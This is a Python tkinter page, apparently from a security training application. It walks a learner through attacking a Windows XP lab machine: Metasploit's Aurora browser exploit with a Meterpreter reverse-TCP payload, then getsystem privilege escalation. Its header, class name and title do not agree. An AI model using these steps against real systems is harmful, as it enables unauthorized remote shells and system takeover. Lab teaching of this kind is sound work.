## ATTACK VECTOR 2 PAGE ##

import tkinter as tk                # python 3
from tkinter import font  as tkfont # python 3
#import Tkinter as tk     # python 2
#import tkFont as tkfont  # python 2

from tkinter import font as tkfont
from tkinter import *
from tkinter import font, messagebox
import random, requests, os, sys
import PySimpleGUI as sg
from nav_bar import *
from subprocess import call, Popen, PIPE
import os

class AttackVectorNine(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        framefont = tkfont.Font(family='Calibri', size=33, weight="bold")


        main_frame = tk.Frame(self)


        highlightFont = font.Font(family='Calibri', size=18)

        global priv_escalation

        priv_escalation = tk.PhotoImage(file='resources/priv_escalation.png')

        def hint():
           messagebox.showinfo("Hint", "You need to choose the appropriate Windows version with chosen exploit. For this attack, we will test on machine running Windows XP.")

        def load_terminal():
            p1 = Popen("exo-open --launch TerminalEmulator", stdout=PIPE, universal_newlines=True, shell = True).stdout

        def change_to_Step1():
            text = (
                "\nStep 1: On Windows machine (remote system)\n\n"
                "o   Open Command Prompt.\n\n"
                "o   Discover IP address of target machine. Type command:\n"
                "     ipconfig\n"

            )
            step1frame = tk.Message(main_frame, text=text, fg='black', bg='white',  font=('Calibri', 20), anchor= 'nw', aspect = 300)
            step1frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
            hintButton = tk.Button(step1frame, text="Hint", bg="#154c79", fg="white", font=highlightFont, command=hint, relief='flat').place(rely=0.02, relx=0.3, relheight=0.05, relwidth=0.04)

        def change_to_Step2():
            text = (
                "\nStep 2: Use Kali Linux virtual machine to launch the attack tool\n\n"
                "o   Click on 'Terminal button'\n\n"
                "o   Type command msfconsole to execute Metasploit\n\n"
                "o   Type command search aurora\n\n"
                "o   In order to use aurora option, type command:\n"
                "     use exploit/windows/browser/ms10_002_aurora\n\n"
                "o   Set the payload, type command:\n"
                "     set payload windows/meterpreter/reverse_tcp\n\n"
                "o   Check the payload options, type command:\n"
                "     show options\n\n"
                "o   Set SRVHOST (your IP address)\n\n"
                "o   Set URIPATH /\n\n"

            )
            step2frame = tk.Message(main_frame, text=text, fg='black', bg='white',  font=('Calibri', 20), anchor= 'nw', aspect = 300)
            step2frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
            terminalButton = tk.Button(step2frame, text="Terminal", bg="#E7E7E7", fg="black", font=highlightFont, command=load_terminal, relief='flat').place(rely=0.65, relx=0.02, relheight=0.05, relwidth=0.1)

        def change_to_Step3():
            text = (
                "\nStep 3: Conduct to exploit the target machine and gain the system privilege with GETSYSTEM\n\n"
                "o   After determining the LHOST and RHOST. To attack the victim machine, type command:\n"
                "     exploit\n\n"
                "o   Copy and run the URL on Internet Explorer via Windows xp system\n\n"
                "o   Check the output in terminal:\n"
                "     => meterpreter session was opened\n\n"
                "o   Escalate the privilege, type command:\n"
                "     getsystem\n\n"
                "o   Show running processes of the victim system, type command:\n"
                "     ps\n\n"

            )
            step3frame = tk.Message(main_frame, text=text, fg='black', bg='white',  font=('Calibri', 20), anchor= 'nw', aspect = 300)
            step3frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)

        # creates blue bar as canvas below nav bar housing label containing title of page
        title_canvas = tk.Canvas(self, bg='#64C1DA', highlightthickness=0)
        title_canvas.place(rely=0.08, relheight=0.12, relwidth=1)
        title_label = tk.Label(self, text="Authentication Bypass", bg='#4D6C84', fg='white', anchor="c", font=framefont)
        title_label.place(rely=0.08, relheight=0.12, relwidth=1)

        allscreenframe = tk.Label(main_frame, bg='white')
        allscreenframe.place(rely=0.2, relheight=1, relwidth=1)

        sidescreenframe = tk.Label(main_frame, text="\n            Steps", bg='#E7E7E7',  font=('Calibri', 20), anchor= 'nw')
        sidescreenframe.place(rely=0.2, relheight=1, relwidth=0.2)

        step1btn = tk.Button(main_frame, text="Step 1", bg="#E7E7E7", fg="black", font=highlightFont, command=change_to_Step1, relief='flat').place(rely=0.3, relx=0.02, relheight=0.05, relwidth=0.1)
        step2btn = tk.Button(main_frame, text="Step 2", bg="#E7E7E7", fg="black", font=highlightFont, command=change_to_Step2, relief='flat').place(rely=0.4, relx=0.02, relheight=0.05, relwidth=0.1)
        step3btn = tk.Button(main_frame, text="Step 3", bg="#E7E7E7", fg="black", font=highlightFont, command=change_to_Step3, relief='flat').place(rely=0.5, relx=0.02, relheight=0.05, relwidth=0.1)

        priv_escalation_label = tk.Label(main_frame, image=priv_escalation)
        priv_escalation_label.place(rely=0.36, relx=0.4)

        display_nav_bar(self, controller)
        main_frame.pack(fill='both', expand=1)
